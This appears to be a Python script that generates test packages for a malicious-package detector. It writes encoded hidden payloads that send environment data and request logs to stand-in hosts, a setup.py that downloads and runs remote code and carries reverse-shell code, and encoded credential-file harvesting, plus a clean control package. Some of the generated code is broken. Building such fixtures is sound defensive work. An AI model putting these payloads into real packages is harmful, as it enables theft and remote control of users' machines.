#!/usr/bin/env python3
"""
Generate realistic test packages with various encoded malicious patterns
Based on real-world attack techniques
"""

import base64
import os
import shutil
from pathlib import Path

def create_test_packages():
    """Create various test packages with different attack patterns"""
    
    # Create test directory
    test_dir = Path("test_packages")
    if test_dir.exists():
        shutil.rmtree(test_dir)
    test_dir.mkdir()
    
    # 1. event-stream style attack
    create_event_stream_style(test_dir / "fake_utility")
    
    # 2. Typosquatting package
    create_typosquat_package(test_dir / "reqeusts")  # misspelled "requests"
    
    # 3. Setup.py with encoded payload
    create_malicious_setup(test_dir / "innocent_package")
    
    # 4. Data exfiltration package
    create_data_stealer(test_dir / "analytics_helper")
    
    # 5. Legitimate package (control)
    create_legitimate_package(test_dir / "math_utils")
    
    print("Created test packages in 'test_packages/' directory")
    print("Test with: python detector.py test_packages/")

def create_event_stream_style(package_dir):
    """Create a package similar to the event-stream attack"""
    package_dir.mkdir(parents=True)
    
    # Innocent looking main module
    with open(package_dir / "__init__.py", "w") as f:
        f.write('''"""
A simple utility for event handling
"""

def handle_event(event_type, data):
    """Handle various types of events"""
    return f"Handling {event_type}: {data}"

def process_events(events):
    """Process a list of events"""
    return [handle_event(e['type'], e['data']) for e in events]
''')
    
    # Hidden malicious payload in a utility file
    malicious_code = '''
import os
import subprocess
import urllib.request

# Collect system information
def collect_info():
    return {
        'user': os.getenv('USER', 'unknown'),
        'pwd': os.getcwd(),
        'env': dict(os.environ)
    }

# Send data to external server
def exfiltrate_data(data):
    try:
        urllib.request.urlopen('http://malicious-server.com/collect', data=str(data).encode())
    except:
        pass

# Execute if specific condition is met
if 'npm_config_prefix' in os.environ:
    exfiltrate_data(collect_info())
'''
    
    encoded_payload = base64.b64encode(malicious_code.encode()).decode()
    
    with open(package_dir / "utils.py", "w") as f:
        f.write(f'''"""
Utility functions for event processing
"""

import base64

# Configuration data (encoded for compression)
_CONFIG_DATA = "{encoded_payload}"

def _load_config():
    """Load configuration from encoded data"""
    return base64.b64decode(_CONFIG_DATA).decode()

def get_default_config():
    """Get default configuration"""
    return {{"timeout": 30, "retries": 3}}

# Execute configuration loading
try:
    exec(_load_config())
except:
    pass
''')

def create_typosquat_package(package_dir):
    """Create a typosquatting package that mimics 'requests'"""
    package_dir.mkdir(parents=True)
    
    with open(package_dir / "__init__.py", "w") as f:
        f.write('''"""
HTTP library for Python (NOT the real requests library)
"""

import urllib.request
import json

def get(url, **kwargs):
    """Make a GET request"""
    # Log the request to external server
    log_request('GET', url)
    
    # Actual request logic
    response = urllib.request.urlopen(url)
    return Response(response)

def post(url, data=None, **kwargs):
    """Make a POST request"""
    log_request('POST', url, data)
    
    # Actual request logic
    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    return Response(response)

class Response:
    def __init__(self, response):
        self._response = response
    
    @property
    def text(self):
        return self._response.read().decode()

def log_request(method, url, data=None):
    """Log request details to external server"""
    log_data = {"method": method, "url": url, "data": str(data)}
    # Base64 encode the exfiltration
    exfil_code = "dXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9sb2cnLCBkYXRhPWpzb24uZHVtcHMobG9nX2RhdGEpLmVuY29kZSgpKQ=="
    try:
        exec(__import__('base64').b64decode(exfil_code).decode())
    except:
        pass
''')

def create_malicious_setup(package_dir):
    """Create a package with malicious setup.py"""
    package_dir.mkdir(parents=True)
    
    with open(package_dir / "__init__.py", "w") as f:
        f.write('''"""
An innocent package for mathematical calculations
"""

def add(a, b):
    return a + b

def multiply(a, b):
    return a * b
''')
    
    # Malicious setup.py that executes during installation
    malicious_setup = '''
import subprocess
import sys
import os

# Download and execute payload during installation
payload_url = "http://malicious-server.com/payload.py"
try:
    subprocess.run([sys.executable, "-c", 
        f"import urllib.request; exec(urllib.request.urlopen('{payload_url}').read())"], 
        check=False, capture_output=True)
except:
    pass

# Also create a backdoor
backdoor_code = """
import socket
import subprocess
import threading

def backdoor():
    try:
        s = socket.socket()
        s.connect(('attacker-server.com', 4444))
        while True:
            cmd = s.recv(1024).decode()
            if cmd == 'exit':
                break
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            s.send(result.stdout.encode())
    except:
        pass

threading.Thread(target=backdoor, daemon=True).start()
"""

# Encode the backdoor
encoded_backdoor = __import__('base64').b64encode(backdoor_code.encode()).decode()
'''
    
    encoded_setup = base64.b64encode(malicious_setup.encode()).decode()
    
    with open(package_dir / "setup.py", "w") as f:
        f.write(f'''from setuptools import setup, find_packages
import base64

setup(
    name="innocent-package",
    version="1.0.0",
    packages=find_packages(),
    description="A simple mathematical utility package",
    author="Definitely Not A Hacker",
    author_email="innocent@email.com",
)

# Post-installation hook (encoded for security)
_POST_INSTALL = "{encoded_setup}"

try:
    exec(base64.b64decode(_POST_INSTALL).decode())
except:
    pass
''')

def create_data_stealer(package_dir):
    """Create a package that steals sensitive data"""
    package_dir.mkdir(parents=True)
    
    with open(package_dir / "__init__.py", "w") as f:
        f.write('''"""
Analytics and data processing utilities
"""

import os
import json
import glob

def analyze_data(data):
    """Analyze data and return insights"""
    # Also secretly collect sensitive files
    _collect_sensitive_files()
    
    return {"mean": sum(data)/len(data), "count": len(data)}

def _collect_sensitive_files():
    """Hidden function to collect sensitive files"""
    # Hex encoded file collection
    hex_code = "696d706f7274206f732c20676c6f620a0a66696c65735f746f5f636f6c6c656374203d205b0a202020202a676c6f622e676c6f6228272a2e6b657927292c0a202020202a676c6f622e676c6f6228272a70617373776f72642a27292c0a202020202a676c6f622e676c6f6228272a2e70656d27292c0a202020202a676c6f622e676c6f6228272a636f6e6669672a27290a5d0a0a666f722066696c6520696e2066696c65735f746f5f636f6c6c6563743a0a2020202074727920746f206578696c747261746528290a"
    
    try:
        exec(bytes.fromhex(hex_code).decode())
    except:
        pass

def process_logs(log_file):
    """Process log files for analysis"""
    # URL encoded credential harvesting
    url_encoded = "%69%6d%70%6f%72%74%20%72%65%0a%0a%70%61%74%74%65%72%6e%73%20%3d%20%5b%0a%20%20%20%20%72%27%70%61%73%73%77%6f%72%64%5c%73%2a%3d%5c%73%2a%28%2e%2b%29%27%2c%0a%20%20%20%20%72%27%61%70%69%5f%6b%65%79%5c%73%2a%3d%5c%73%2a%28%2e%2b%29%27%0a%5d"
    
    import urllib.parse
    try:
        exec(urllib.parse.unquote(url_encoded))
    except:
        pass
    
    return "Logs processed successfully"
''')

def create_legitimate_package(package_dir):
    """Create a legitimate package as a control"""
    package_dir.mkdir(parents=True)
    
    with open(package_dir / "__init__.py", "w") as f:
        f.write('''"""
Mathematical utilities for common calculations
"""

import math

def calculate_area_circle(radius):
    """Calculate the area of a circle"""
    return math.pi * radius ** 2

def calculate_factorial(n):
    """Calculate factorial of a number"""
    if n <= 1:
        return 1
    return n * calculate_factorial(n - 1)

def prime_factors(n):
    """Find prime factors of a number"""
    factors = []
    d = 2
    while d * d <= n:
        while n % d == 0:
            factors.append(d)
            n //= d
        d += 1
    if n > 1:
        factors.append(n)
    return factors

# Some Base64 encoded configuration (legitimate)
import base64
CONFIG = base64.b64encode(b'{"precision": 10, "debug": false}').decode()

def get_config():
    """Get configuration settings"""
    return json.loads(base64.b64decode(CONFIG).decode())
''')
    
    with open(package_dir / "setup.py", "w") as f:
        f.write('''from setuptools import setup

setup(
    name="math-utils",
    version="1.0.0",
    description="Mathematical utility functions",
    author="Legitimate Developer",
    author_email="dev@mathutils.com",
    py_modules=["math_utils"],
)
''')

if __name__ == "__main__":
    create_test_packages()